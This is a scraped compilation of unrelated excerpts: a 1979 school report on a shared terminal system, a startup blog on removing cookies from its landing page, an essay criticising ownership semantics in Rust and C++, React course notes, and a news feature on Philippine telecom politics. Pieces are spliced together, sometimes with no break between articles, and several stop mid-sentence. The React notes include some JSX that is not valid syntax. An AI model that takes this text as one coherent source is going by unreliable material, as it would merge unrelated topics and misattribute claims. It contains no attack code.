<p><em>The system is a fairly standard computer package apart from one important modification. The signal from one visual display unit is taken and fed to a television monitor. Normally a single terminal is used by an individual or at most by a small group working on a particular project. The intention of having the signal from one terminal displayed on a large television monitor was to enable full classes of thirty boys to see a particular piece of computing. However, one monitor proved insufficient and by including a signal converter and amplifier the signal from one terminal can now be displayed on three domestic television sets. When a full class is taken into the terminal room teaching can be given to all by linking all four terminals together and displaying the data on them and on the three television sets. As far as is known this particular part of the system is an innovation as regards the teaching of computing in schools, particularly as part of the electronics required to convert the signals to be compatible with domestic television sets was designed and built in School.</em></p>

<p><em>The system is thus being used in two different ways: for individual and small group activity or with the system linked together for class teaching. So far no examination teaching has been undertaken and at present none is envisaged. The intention is to use the computer in the classroom as a tool to teach a computer language, which will enable boys to undertake projects on their own, and as an aid to enrich and extend the normal teaching of Mathematics. Boys will find that they are taken to the terminal room perhaps for a complete period or for only ten minotes of a Mathematics period during which some particular part of the subject matter being developed will be illustrated using the computer.</em></p>

<p><em>The system has been planned with future expansion in mind. When the wiring was installed two extra cables were taken into room 34; and therefore two more terminals can be added to the system fairly easily as and when they are required. Further expansion is possible; up to twenty-four terminals can be serviced by the processor! To achieve this additional memory will have to be added to the processor.</em></p>

<p><em>Following the delivery of the system in January 1979 and after all testing had been carried out by the suppliers the computer was in limited use in early March. Since then the number of users has increased considerably. The computer is available for general use from 8.00 am to 5.00 pm and is heavily used by boys from the first to the sixth form before morning school, during the lunch hour and after school. Considerable use has been made during teaching time for class sessions, and sixth formers are able to use the computer in their private study time. During the final three weeks of the summer term about nine hundred log-ins were recorded! As this period included the preparation for the Open Days when the system was out of general use, there appears to be a growing for the facility the computer now provides.</em></p>

<p><em>During the summer term three after-school courses were provided to each the BASIC language, two for juniors new to the system and one for those with considerable experience in computing. It is hoped that more of these courses will be provided for boys at all levels in the School in the coming years.</em></p>

<p><em>Looking back over the period of the installation of the computer and the enthusiasm it has generated with boys of all ages, I anticipate a growing demand for computer time and an enhancement of the teaching of Mathematics in the School.</em></p>

<p>Here’s a grainy photo that accompanied the article in the school magazine. You can see one of the “VDU” (Visual Display Unit) terminals, and you can see a better picture of one of these in the photo of the Systime unit at the end of this post, but can you also spot the <a href="http://vtda.org/docs/computing/IntertecDataSystems/1100500-00_SuperTermMaintenance_1978.pdf">Superterm</a> paper-based terminal (back right)?</p>

<p>Moreover, furthest away from the camera, there’s the original Texas 733 terminal, also paper-based. Here’s a better picture of one, from the <a href="http://www.bitsavers.org/pdf/ti/terminal/brochures/TI-327-A-10M_Silent_700_Model_732_733_Brochure_Sep_1973.pdf">original brochure</a>.</p>

<p>Here’s a picture of what the computer unit looked like - it’s a photo (courtesy of <a href="http://www.chilton-computing.org.uk/">Computing at Chilton</a>, thank you) of a Systime unit, and the terminal on the desk is the same as those that we had in the computer room.</p>

In short - a good intentioned idea.</p><p>However, basically every website in the world took the easier, less introspective approach - prompting for consent - creating an objectively worse web experience for everyone.</p><p>Since at <a href="https://leavemealone.app/">Leave Me Alone</a> we're trying to set an example of how to run a privacy friendly company, we decided to figure out how we could remove all the cookies from our landing page without sacrificing anything important. This means no more cookie banner, no more tracking! 🍪</p><p>We had three main cookie monsters that will be well known to SaaS companies;</p><ol><li>Web analytics</li><li>Live Chat</li><li>Security (DDOS protection etc)</li></ol><p>Before we start, I'm not neccessarily saying I distrust any of these companies and how they use cookies...so make your own judgement about them. We're just in this to get cookie free! </p><h2 id="web-analytics">Web Analytics</h2><p>To track our page views and general visitor behaviour, like <a href="https://trends.builtwith.com/analytics/Google-Analytics">most sites</a>, we were using Google Analytics. </p><p>Google Analytics sets a little cookie on page load to "remember" what a visitor has done on each page as they navigate around a site. This allows it to create a profile of the visitor so you can figure out exactly what it takes to get a visitor to sign up or convert, or whatever it is that you're trying to measure.</p><p>Realistically we never really use this information, so it's an easy one to get rid of. There are actually a handful of simpler web analytics platforms that don't use cookies, and we opted to try <a href="https://simpleanalytics.com/">Simple Analytics</a>. With this we get basically all the info we ever got out of Google Analytics (page views), so it seems like a great compromise.</p><p>You can even make your analytics pages public, which fits nicely with our "<a href="https://blog.leavemealone.app/how-we-share-company-stats-and-metrics-publicly/">open startup</a>" work ethic.

We used to use Crisp for this, which uses a cookie to match a browser session to messages in their system. Their <a href="https://help.crisp.chat/en/article/crisp-chatbox-cookie-and-ip-policy-1147xor/">privacy policy</a> says this is "not used for tracking purposes", but given all the data they show in their UI about visitors that's not exactly much comfort. </p><p>(It even guesses a load of personal info from the visitors' email address like what company they work for and their job title using something called <a href="https://go.crisp.chat/notice/domain-enrich/">Crisp Enrich</a> which is apparently impossible to find any info about but sounds shady as hell).</p><!--kg-card-begin: image--><figure><img src="https://blog.leavemealone.app/content/images/2020/11/image-6.png"><figcaption>I don't know why I would care about half of the stuff Crisp automatically collect on people who are just asking for help on my website 🤷‍♂️</figcaption></figure><!--kg-card-end: image--><p>So, this is a top priority since it looks like an absolute privacy and tracking nightmare.</p><p>I get that this is a difficult one, but there's literally no service we could find to do this cookieless (or even mildly privacy focused) so we ended up heavily modifying an open-source project called <a href="https://github.com/idoco/intergram">Intergram</a> to do what we wanted. Intergram works like a regular chat widget, but it communicates with the chat app Telegram via a self-hosted server - meaning at least we're in control of the code. Our modified chat widget now looks like this (and the code is <a href="https://github.com/squarecat/squarechat">open-source</a>);</p><!--kg-card-begin: image--><figure><img src="https://blog.leavemealone.app/content/images/2020/11/Group-54.png"></figure><!--kg-card-end: image--><p>Unfortunately it still requires some place to store the messages locally so that the visitor has a copy of them, but we still made this work by only storing anything <em>after</em> the chat has been opened. Unlike Crisp that injected it's cookies when it felt like it. We also don't collect any tracking crap like Crisp does, only chat messages!</p><p>We sweetened the deal by adding a consent prompt to the chat widget itself like this;</p><!--kg-card-begin: image--><figure><img src="https://blog.leavemealone.app/content/images/2020/11/Group-53.png"></figure><!--kg-card-end: image--><p>🍪 Cookie Verdict = 3/5 - fewer cookies, more privacy.</p><h2 id="security">Security</h2><p>This was a tricky one. We use Cloudflare as a security layer to protect the website from denial-of-service attacks. We also use their CDN to cache our assets so that the site loads extra fast, and use their DNS because it's hella convenient.</p><p>To perform their protection Cloudflare stores a cookie called <em><code>_cfduid</code></em>,<em> </em>which is used to track each client and somehow figure out if they're a malicious actor or something. I don't really know and <a href="https://support.cloudflare.com/hc/en-us/articles/200170156-Understanding-the-Cloudflare-Cookies">their description is clear as mud</a>.

<p>I have been toying with a theoretical idea for the past 18 months off-and-on in my head and I have not fully articulated it aloud yet. It is regarding the concept of <em>Ownership Semantics</em> (OS) or <em>Move Semantics</em> in programming languages. Fundamentally this article is a criticism of the concept and states that the concept is a duality of traditional OOP but applied to a different area.</p>
<h2 id="general-definitions-of-terminology">General Definitions of Terminology</h2>
<p>A general list of definitions of terminology used within this article in order to minimize confusion.</p>
<ul>
<li>
<p>A <em>Value</em> is a datum with an associated type</p>
</li>
<li>
<p>A <em>(Data) Type</em> is an attribute of a value which encodes information about how the data value can be operated upon</p>
</li>
<li>
<p>An <em>Object</em> is a value with associated behaviour, and thus implies it has <em>agency</em></p>
</li>
<li>
<p>A <em>Class</em> is the data type of an <em>Object</em></p>
</li>
<li>
<p>A hierarchy of value ownership is a hierarchy of responsibility of values</p>
</li>
<li>
<p>An <em>Owned-Value</em> is a value which belongs to a hierarchy of value ownership, which implies it is governed by an <em>agent</em></p>
</li>
<li>
<p>An <em>Agent</em> is an actor with the capacity to act within a given environment</p>
</li>
<li>
<p>A <em>Model of Interpretation</em> is a way to view and analyse a subject</p>
</li>
<li>
<p>A <em>Paradigm</em> is a way of classifying models of structure of programming languages; a <em>Paradigm</em> is a <em>model of interpretation</em></p>
</li>
<li>
<p><em>Object Orient(at)ed Programming (OOP)</em> - A paradigm of structuring a program around the sole concept of <em>Objects</em>, commonly through coupling data and code into a single unit.</p>
</li>
<li>
<p><em>Ownership/Move Semantics (OS)</em> - Orientation around responsibility of values in a hierarchical fashion</p>
</li>
</ul>
<h2 id="foundations-of-the-object-orientation-paradigm">Foundations of the Object Orientation Paradigm</h2>
<p>Though the original conception of the term coined by Alan Kay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> was never used as he intended it to be, the term <em>Object Orient(at)ed Programming (OOP)</em> has been commonly understood to be a paradigm of structuring a program around the concept of <em>Objects</em>, commonly through coupling data and code into a single unit. Many languages support multiple paradigms, including aspects for the OOP paradigm, but I would class those as multiparadigm rather than being <em>solely</em> an OOP language.</p>
<p>Most languages implement <em>Objects</em> and <em>Classes</em> in the Simula tradition; most of the notable OOP languages have a similar form by defining methods (member functions) within the class definition. Traditionally languages such as Java can be classed as <em>solely</em> an OOP language.</p>
<p>Most traditional OOP languages are based around the concept of <em>inheritance</em>, a mechanism of deriving a class data type from another class data type and retaining similar information. Most people generally view inheritance as a combination of <a href="https://en.wikipedia.org/wiki/Subtyping">subtyping</a> and <a href="https://en.wikipedia.org/wiki/Dynamic_dispatch">dynamic dispatch</a> through <a href="https://en.wikipedia.org/wiki/Virtual_method_table">virtual method tables (vtables)</a>. This has lead to many discussions asking whether a language can be called as OOP if it does not support inheritance<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<p>In recent times, <em>inheritance</em> has been falling out of fashion in favour of <em>composition</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>. This is mostly due to the issue of conforming a <em>class</em> to a strict (singular) hierarchy of agency when in reality, things can belong to many (if not infinite) categories and hierarchies, as well as another aspect which I will be discussing throughout this article.</p>
<p>There are many criticisms of OOP<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup><sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup><sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup><sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup><sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup><sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup> but my general criticism is that by placing emphasis on trying to solve problem in the type system, it shifts focus from the data structures and algorithms, <a href="http://www.gingerbill.org/article/2020/05/31/progamming-pragmatist-proverbs/#the-concept-of-programming">the core of what a program fundamentally is</a>.</p>
<p>Since objects themselves are being treated <em>as if</em> they have behaviour (not just type properties), they are effectively being treated as if they were <em>agents</em> in the program. This mental model has many conclusions, many of which cause issues.</p>
<p>In my article <a href="https://www.gingerbill.org/article/2020/05/31/progamming-pragmatist-proverbs/"><em>Pragmatism in Programming Proverbs</em></a>, I state:</p>
<blockquote>
<p>Object orientated programming is a form of misinterpreted and misapplied Aristotelian Metaphysics applied to a domain it was never meant to model</p>
</blockquote>
<p>What I mean by this statement is that <em>artificially</em> conforming any/all relationships between data and types to an artificial hierarchy of <em>agency</em> is a form of naïve-Aristotelian metaphysics. Since there is no actual <em>agency</em> in the programming objects, it is a partial fallacy. When trying to conform a program to have a particular structure when it does not naturally, the absence of a structure in a program is more useful than a bad structure.</p>
<h3 id="methods">Methods</h3>
<p>The concept of adding methods to classes/objects has proven useful to many. The real questions are:</p>
<ul>
<li>Why?</li>
<li>And how do people actually conceptualize methods on a day-to-day basis?</li>
</ul>
<p>For most people, I am going to bet that methods, in languages with an emphasis on inheritance rather than composition (such as C++ or Java), are treated as a way of categorizing and associating functions/procedures with a data record. There are a few reasons for this approach:</p>
<ul>
<li>Easy to organize and search for procedures by a data type</li>
<li>Allowing methods as a form of syntactic sugar for writing calls in a <em>subject verb object</em> manner e.g. <code>foo_do_thing(x, y)</code> vs <code>x.do_thing(y)</code></li>
<li>Mental model of behaviour for objects</li>
</ul>
<p>From experience, I have found that long time users of “OOP” languages eventually start treating methods primarily in the first two approaches.</p>
<p>I will not go into depth about the other main aspects of OOP such as encapsulation, local retention, forms of polymorphism, etc, as the hierarchical nature is the fundamental aspect of focus for this article. The (linear) hierarchy of agency is the main problem. The reason why people argue for <em>composition over inheritance</em> is that it flattens this linear hierarchy, reducing its effect. It is the transition from <a href="https://en.wikipedia.org/wiki/Nominal_type_system">nominal typing</a> to <a href="https://en.wikipedia.org/wiki/Structural_type_system">structural typing</a>, which is more flexible because many data structures and problems have a <em>non-linear</em> nature to them, which <em>linear</em> approaches <strong>cannot</strong> handle. When trying to adhere to the the strict hierarchical type system approaches, it leads to numerous issues because data is more commonly graph-like (non-linear) than tree-like (linear) for most problems. This strict hierarchy does occur with encapsulation at the object level too, a strict hierarchy of messages/references; this hierarchical nature arises from the concept agency itself, inheritance is not the root cause.</p>
<p><strong>n.b.</strong> Inheritance is not all bad and does have many real life practical uses, but these costs must be known before using them, like with any tool.</p>
<p><strong>n.b.</strong> The linearity is with regards to the data structures themselves and not the algorithms.</p>
<h2 id="foundations-of-the-ownership-semantics-paradigm">Foundations of the Ownership Semantics Paradigm</h2>
<p><a href="https://en.wikipedia.org/wiki/C%2B%2B">C++11</a> introduced the concept of <em>move semantics</em> or <em>ownership semantics</em> (OS), a way to minimize the copying of data through copy constructors. It utilizes the added concept of r-value references (<code>T &amp;&amp;</code>) as a means to do this. However, the concept began to be used for a lot more than its basic purpose. The concept adds the high level abstraction of “moving” objects rather than “copying” objects. Physically, a computer only ever copies and this high level abstraction, to treat objects <em>as if</em> they were “real objects”, is not what actually happens. It is also a <a href="https://en.wikipedia.org/wiki/Category_mistake">category error</a> to treat them as “real objects” since “real objects” and “programming objects” have little connection with each other ontologically. When a value or object is “moved”, this means is that the <em>responsibilities</em> of the resources of that object have been transferred to another object or environment—<em>agents</em>. In this case, ownership/move semantics is fundamentally based around the <em>responsibilities of values</em> by tracking value usage.</p>
<p>In this model of agency, the arena of agency can take on many forms, such as blocks, procedure bodies, or aggregate values. Therefore some <em>owned-values</em> also <em>own</em> other values, and thus a value could have agency.</p>
<p>If we were to call Ownership Semantics a paradigm, it would be the orientation around the <em>responsibility of values</em> in a hierarchical fashion, placing emphasis on this system of responsibility, shifting focus from data structures and algorithms.</p>
<p>The concept of <em>responsibility</em> and <em>ownership</em> is similar to the real world counter parts in that to own something means to have exclusive use and full responsibility over it.</p>
<p><a href="https://www.rust-lang.org/">Rust</a> is a multi-paradigm programming language but at its core is an Ownership-Orientated language. Everything in Rust has a concept of <em>“ownership”</em> and <em>lifetime</em> associated with it. Rust is designed around trying to be first and foremost “safe”, especially with regards to concurrency. Rust derives from the C++ family in terms of philosophy and style, but uses a more <a href="https://www.gingerbill.org/article/2018/03/12/on-the-aesthetics-of-the-syntax-of-declarations/">qualifier-focused</a> declaration syntax and many concepts from functional languages from the <a href="https://en.wikipedia.org/wiki/ML_%28programming_language%29">ML family</a>.</p>
<p><em>Lifetimes</em> are theoretically orthogonal to <em>ownership</em> but in practical, they usually are intrinsically coupled. I will not discuss the problems with object-based lifetimes in this article.</p>
<p>The following Rust code can be used to demonstrate this responsibility transfer between different capturing things such as <code>let</code> statements:</p>
<pre><code>pub struct Foo {
	value: i32,
}

fn main() {
	let foo = Foo{value: 123};
	let bar = foo; // the responsibility of `foo` is transferred to `bar`

	println!("{}", foo.value); // error: use of moved value: `foo.value`
	println!("{}", bar.value);
}

</code></pre>
<p>Rust is an immutable-by-default language, with the option to opt into mutability with <code>mut</code>. Immutability helps a lot with mathematical proofs for logic since things things can be “flattened” quite easily, however virtually all computers are fundamentally mutable things, even if the abstraction of immutability is a useful tool. As a result, the ownership semantics system requires a few more rules to take into account mutability, by adding the concept of “borrowing” through references. The general rules for the borrow checker are:</p>
<ul>
<li>Each value may have as many immutable borrows as you want</li>
<li>Each value may only have one mutable borrow at a time</li>
<li>Each value may not borrow immutably and mutably at the same time</li>
<li>Values will be “dropped” when the owning connecting goes out of scope</li>
<li>Taking a value by <code>self</code> <code>Drop</code>s the original value</li>
</ul>
<p>When using Rust (or move semantics to their full extent in C++11), most people will fight the borrow …</p></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="intro"><a href="#intro" aria-label="intro permalink"></a>Intro</h2>
<p>At this moment in my career, I’m a Javascript fullstack developer in the early stages. I’ve a good knowledge of Javascript, however React gives me sometimes a little more than a headache to understand deeply. I grew up in my learning with class based components, so later, when hooks were introduced, I found a little difficult to transition to this new way of writing React. That’s why I wanted this course. </p>
<p>As part of my learning process, I’m going to note down not everything, but what I learnt, for each section. Often my solution was, although working, more complicated and less elegant than Kent’s one. That’s another aspect I wish to improve in my coding. </p>
<p>Of course you will find many more details and, well, the workshop itself directly in <a href="https://epicreact.dev/">epicreact.dev</a>
I hope this will be useful to somebody else apart from me, and forgive my mistakes in English (not a native speaker).
<br></p>
<h2 id="01-basic-javascript-rendered"><a href="#01-basic-javascript-rendered" aria-label="01 basic javascript rendered permalink"></a>01: Basic JavaScript-rendered</h2>
<p>In the first exercise, it’s necessary to make some DOM manipulation with plain Javascript. As I’m using this method in my daily work, I had no difficulties in the first part. As a matter of fact, I’m learning a lot into transforming a codebase that is heavily relying on jQuery into plain Javascript.</p>
<p>However, I did have to do some thinking on the additional exercise, as I’m not used to work with the root element of the body. So I personally didn’t know -but now that I know, it makes sense - that there’s a body object inside the document object. I won’t give here the solution, but it’s an important reminder to always check the parent elements… what are they hiding inside :)
<br></p>
<h2 id="02-intro-to-raw-react-apis"><a href="#02-intro-to-raw-react-apis" aria-label="02 intro to raw react apis permalink"></a>02: Intro to raw React APIs</h2>
<p>The second exercise of the workshop was already trickier - which I was happy about because definitely I didn’t want to learn again the same stuff.
It’s not often, if ever, that we are using the React.createElement. Using JSX we just skip this part, but that’s how it works under the hood.
So after learning what jQuery is doing in Javascript, now it’s React in Javascript. </p>
<p>First thing I learnt here is that the famous property ‘children’, in React, corresponds to textContent in plain JS. It makes sense, of course, as a matter of fact we are rendering some text made visually in HTML.</p>
<p>The second thing is that createElement has three - or more - arguments that can be passed. </p>
<ol>
  <li>The type of element (span, div, etc)</li>
  <li>The object passed inside the element (class, children, etc)</li>
  <li>A n number of other objects, that will be rendered as additional children.</li>
</ol>
<p>As a matter of fact, the children property doesn’t even have to be defined inside the second argument of createElement, but can be listed at the end of the method.
<br></p>
<h2 id="03-using-jsx"><a href="#03-using-jsx" aria-label="03 using jsx permalink"></a>03: Using JSX</h2>
<p>The third exercise was about creating simple JSX elements that Babel will transform in normal JS with React.createElement. As it’s basically almost a reverse engineering of the previous exercises, it was not difficult. However, it was interesting the use of the spread operator inside a div element, which createElement puts in the correct position:</p>
<div data-language="text"><pre><code>const className = 'myClass';
const children = 'this is my text';
const props = { children, className }
element = &lt;div {...props}/&gt;</code></pre></div>
<p>It will create a div with its own class and the innertext as children.</p>
<p>Another interesting point in the video is about prioritazion of position using the spread operator. Supposing that we have the above props, but then we want to override the className with another name, we have to place the spread props before. In synthesis, the right argument will always override the left ones.</p>
<div data-language="text"><pre><code>&lt;div {...props, className='secondClass'} /&gt; // &lt;div className="secondClass"&gt;
&lt;div {className='secondClass', ...props} /&gt; // &lt;div className="myClass"&gt;</code></pre></div>
<h2 id="04-creating-custom-components"><a href="#04-creating-custom-components" aria-label="04 creating custom components permalink"></a>04: Creating custom components</h2>
<p>So here we go finally to start creating components. The first part consists in creating a function that basically returns a div, so instead of repeating div div in the rendered element, we just pass the function with the string as “children”. One thing that I knew but forgot explicitly is that if I pass a parameter to the function as an object, the argument must be an object as well. So:</p>
<div data-language="text"><pre><code>helloFunction = ({children}) =&gt; {
  return &lt;div&gt;{children}&lt;/div&gt;
}

helloFunction({ children: 'Hello' });</code></pre></div>
<p>The next point was to implement this function as an element:</p>
<p><code>const myElement = React.createElement(message, { children: 'Hello!' })</code></p>
<p>and finally incorporate it in the element itself, which will be taken into ReactDom.render:</p>
<div data-language="text"><pre><code>const element = (
  ...
  {myElement}
)</code></pre></div>
<p>Following that, it’s about referring the same helloFunction but make it directly compiled through Babel as an element, without needing to pass through createElement. This is possible thanks to JSX, and it’s enough to make the function name with first letter as capital, and reference it inside the element object as that.
<code>HelloFunction = () = {}</code></p>
<p><code>&lt;HelloFunction&gt;Hello!&lt;/HelloFunction&gt;</code></p>
<p>This is the equivalent of <code>React.createElement(HelloFunction, null, 'Hello!')</code></p>
<p>Next, it was the time of implementing propTypes for typechecking, giving the same above function to have two parameters, both strings. In the workshop, it’s explained how to make a propTypes function for checking manually the type. But it’s interesting that it’s not taking advantage of the prop-types library. It is true that for a simple check of two props, importing a whole library is excessive; but I don’t think I’ll ever just use two checks. </p>
<p><code>&lt;script src="https://unpkg.com/prop-types@15.6/prop-types.js"&gt;&lt;/script&gt;</code></p>
<div data-language="text"><pre><code>HelloFunction.propTypes = {
      greeting: PropTypes.string,
      subject: PropTypes.string,
    }</code></pre></div>
<p>I’m not getting either a personalized message, but the standard warning is understandable enough</p>
<div data-language="text"><pre><code>Invalid prop `subject` of type `number` supplied to `Message`, expected `string`. in HelloFunction</code></pre></div>
<p>Ah, here we go, in the next exercise there’s the implementation of the library… ooooops, I went a little over head. But good point, to implement also ‘isRequired’</p>
<div data-language="text"><pre><code>HelloFunction.propTypes = {
      greeting: PropTypes.string.isRequired,
      subject: PropTypes.string.isRequired,
    }</code></pre></div>
<p>Anyway, Typescript rules!
<br></p>
<h2 id="05-styling"><a href="#05-styling" aria-label="05 styling permalink"></a>05: Styling</h2>
<p>In this  exercise it was needed to apply style to a custom component in various ways. On a first part, just adding inline styling to a small div; then to a custom component passing its className prop; finally, passing only a string as a size prop and selecting dynamically the style inside the custom component.</p>
<p>First note: when making a reusable component, normally it’s good to place all defaults on the left and what the user is providing (spread operator) after, because we don’t want to enforce something.</p>
<p>Second note: as usual I overcomplicated things. As the size property passed would be only small, medium and large, and the classes are called box—small, box—medium, box—large, it’s enough to substitute the size with the size prop passed into the component.</p>
<p><code>box--${size}</code></p>
<p>adding that to a ternary operator in case it’s the prop is not present.
What I did instead was a nested ternary operator with an object created with the classes names inside. Much more complicated, although it was working 😁</p>
<div data-language="text"><pre><code>const sizes = {
  small: 'box--small',
  medium: 'box--medium',
  large: 'box--large'
}

className={`box ${size === 'small' ? sizes.small : size === 'medium' ? sizes.medium : sizes.large}`}</code></pre></div>
<h2 id="06-forms"><a href="#06-forms" aria-label="06 forms permalink"></a>06: Forms</h2>
<p>In the first exercise, the object is creating a submit listener/handler that will call the function in the main component, which is passed through as a prop.</p>
<p>We can put events (will be React synthetic events) on each element; however, the onSubmit goes inside the form to catch every field that is contained.
Synthetic events are objects that React creates that look and behave like regular DOM events.
It’s still possible to access the DOM event with <code>event.nativeEvent</code>, however, the synthetic one is optimized to work with React code, and the virtual DOM.</p>
<p>I created then a function inside the function (a callback), called once the submit button is clicked. And I’ve added the preventDefault() to that event to prevent the page to refresh (as default event for a form).</p>
<p>Another interesting thing is about accessibility. Screen readers need to associate the input with its label. So it’s needed to give the input an id and the label a htmlFor (the same for= parameter in normal HTML). Moreover, this gives the property of focusing on the input when clicking on it.</p>
<p>The second part of the exercise was about doing the same as above but using the useRef hook. UseRef are simply reference pointers to an element.
First, it’s needed to be imported from ‘react’ and not ‘react-dom’.</p>
<p>Then, adding the reference to our input
<code>&lt;input ref={usernameInput}&gt;</code>
In the main function (or custom component), we can call the hook: <code>const usernameInput = useRef(null);</code>
Why null? The argument of useRef is the initial value. But in this case we don’t need that, just what will be in usernameInput.</p>
<p>Finally, we can access all our referenced properties, like the input value, this way: <code>usernameInput.current.value</code></p>
<p>In the next credit, it was needed to create a controlled input. A controlled input is an input field that is controlled by the component state. That means setting the value of the input by the state: <code>&lt;input ref={usernameInput}  value={username} onChange={handleChange} /&gt;</code></p>
<p>Then, we can set the state at the top of the component: <code>const [username, setUsername] = useState('');</code>
And finally, use that state to change the value of the input in the handleChange function. In this case, transforming every key to lowercase:</p>
<div data-language="text"><pre><code>const { value } = event.target;
setUsername(value.toLowerCase());</code></pre></div>
<p>So the flow is the following:
input from user —&gt; update input state —&gt; transforming input state -&gt; sending the state as value of the input —&gt; input appears on screens.
<br></p>
<h2 id="07-rendering-arrays"><a href="#07-rendering-arrays" aria-label="07 rendering arrays permalink"></a>07: Rendering Arrays</h2>
<p>The exercises were just little demonstrations in this case, to show the importance of using a unique index key when showing elements in the DOM through a mapping. Not without, not with the pre-built index of the map function, but with a preset set of keys to …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>In late July, during a meeting with his cabinet, Phillipine President Rodrigo Duterte sat at the head of a large table, the country’s official seal hanging behind him. “That’s Ernest Cu,” he said with a slight smile, gesturing to one of the men seated nearby. “I told him, if you don’t improve the service, I will hang you on one of your towers.”</p>



<p>Cu is the president and CEO of Globe Telecom, one of only two mobile network companies operating in the Philippines. Just days before, during his annual state of the nation address, Duterte warned that he was prepared to shut down Globe and its competitor, Philippine Long Distance Telephone (PLDT), and seize their assets, if the companies failed to improve service by the end of the year.</p>



<p>A strongman populist who came to power in 2016, Duterte has singled out the telecom industry as part of a broader war against powerful oligarchs who dominate the country’s economy. During his election campaign, he pointed to painfully slow internet speeds — at the time, the second-slowest in Asia — and warned that, if they didn’t improve, he would bring in a third operator to boost competition. Speeds in the Philippines have since increased dramatically, <a href="https://technology.inquirer.net/87428/internet-speed-in-ph-doubles-from-q3-2016-to-q1-2019-report">more than doubling</a> between 2016 and 2019. But Duterte handed out a third license anyway, to Dito, a Chinese-backed company expected to launch in the coming months.&nbsp;</p>



<p>Duterte is a divisive figure who often lobs outrageous threats at his opponents. He recently <a href="https://www.nytimes.com/2020/09/29/business/rodrigo-duterte-facebook-philippines.html">lashed out</a> at Facebook, for example, after the social network took down an army of fake accounts that spread support for his policies. But broadband speeds are a popular issue with voters: In 2018, <a href="https://edition.cnn.com/2019/02/01/health/philippines-highest-internet-use-scli-intl/index.html">Filipinos were the heaviest users of the internet anywhere in the world</a>, spending on average more than 10 hours a day online, according to one report by the marketing agency We Are Social.&nbsp;</p>



<p>“Part of the genius of the president is that his team is able to pick out issues that are really close to the gut of Filipinos,” says Michael Henry Yusingco, a senior research fellow at the Ateneo School of Government. He says that, if the president can use his tough policies to drastically improve internet service, “it’s a big plus for his dynasty and also for the allies of his dynasty.”</p>



<h3><strong>How did cell towers get so political?</strong></h3>



<p>A small group of elite families has long controlled the Philippines, overseeing everything from mining to real estate and infrastructure. The internet is no different, partly because barriers to entry in the sector are so high. A 1995 law regulating telecom companies still requires new entrants to invest in expensive and often unprofitable landlines. “It actually forces industry players to invest in technology or offer a service that is becoming obsolete,” says Mary Grace Mirandilla-Santos, an independent telecommunications researcher in the country.</p>

<p>The only companies that could afford to invest in landlines were cash-rich conglomerates and those run by “old-money” families, like the Ayalas, who are major stakeholders in Globe, or the real-estate-to-airlines conglomerate JG Summit, which is a major shareholder in PLDT. “Our current investment structure in the Philippines is very limited. There are only a few families or groups that can raise the amount of money to put forward a third telco business,” says Yusingco.</p>



<p>Larger companies have also swallowed new upstarts in the space. In 2016, <a href="https://www.reuters.com/article/us-pldt-san-miguel-m-a-approval-idUSKCN0YL07K">PLDT and Globe together bought out their only rival, Vega Telecom</a>, which was started by San Miguel Corporation, another giant conglomerate. Mirandilla-Santos says that, during its short stint, Vega did have a positive impact on the market: In 2015, <a href="http://www.investphilippines.info/arangkada/wp-content/uploads/2016/02/BROADBAND-POLICY-BRIEF-as-printed.pdf">1GB of data cost approximately $7.10</a>, according to her research. By the end of 2018, that number fell to just <a href="https://mgmresearch.com/worldwide-mobile-data-pricing-rankings-2019/">$3.16</a>. Dito’s entry could similarly drive down prices.</p>



<p>Without competition, there was little incentive for Globe or PLDT to invest in upgrading their network infrastructure or lowering data rates costs. A <a href="https://lirneasia.net/2014/03/broadband-quality-of-service-experience-qose-indicators/">2014 study by the think tank LIRNEasia</a> found that internet users in the Philippines paid more for worse connectivity than in almost anywhere else in Asia, holding back development of the country’s technology sector.</p>



<p>“The issue has historically been that data is just too expensive,” says Henry Motte-Muñoz, the founder and CEO of Edukasyon, the country’s leading digital education platform. “So you have a lot of users who, if they could, would spend more time on your site, but they don’t.”</p>



<h3><strong>Will a third mobile operator really help?</strong></h3>



<p>Duterte’s war against Globe and PLDT appears to be working. When the new president came into office, 25% of Edukasyon’s internet traffic came from Free Basics, a Facebook program that gives Fillipinos free access to some websites, including Motte-Muñoz’s. Today, it’s closer to 10%. “[The price cut] was massive for us because, for lower-income students, Free Basics was the only way to use the internet,” Motte-Muñoz says.&nbsp;</p>

<p>More affordable data has also spurred entrepreneurship. In 2018, after prices came down, Rexy Josh Dorado founded <a href="https://restofworld.org/2020/the-disneyland-of-social-media/">Kumu, a livestreaming app that now has more than 1 million monthly active users</a>. Price, though, is only one part of the problem: The quality of internet connections remains patchy at best, particularly outside of major urban areas. In the rural city of Dumaguete, where Dorado is from, the internet works just on the main street of his hometown. “If you drive five minutes out, it’s basically dead,” he says.</p>



<p>Together, Globe and PLDT have constructed around 18,000 cell towers, half of what the Philippines’ Department of Information and Communications Technology says is needed for optimal coverage. To build more, Globe told <a href="https://business.inquirer.net/303993/dutertes-telco-takeover-threat-compounds-red-tape-woes-200-days-to-get-permits"><em>The Philippine Daily Inquirer</em></a>, it has to comply with burdensome state requirements, including getting 28 to 30 licenses that can take upward of eight months to secure. But over the last three years, Globe and PLDT, up against the same regulations, have poured 30% more money into infrastructure investments, according to data from the credit agency Fitch Ratings.</p>



<p>So why, after all that progress, did the president decide to bring in a third competitor?</p>

<h3><strong>What is Dito, and will it succeed?</strong></h3>



<p>Dito, Duterte’s new competitor for Globe and PLDT, is run in part by the Udenna Group, a shipping and oil giant owned by Dennis Uy, an old political ally of the president and one of the <a href="https://news.abs-cbn.com/focus/12/05/16/p334m-from-only-13-donors-funded-dutertes-presidency">largest contributors</a> to his campaign in 2016.</p>



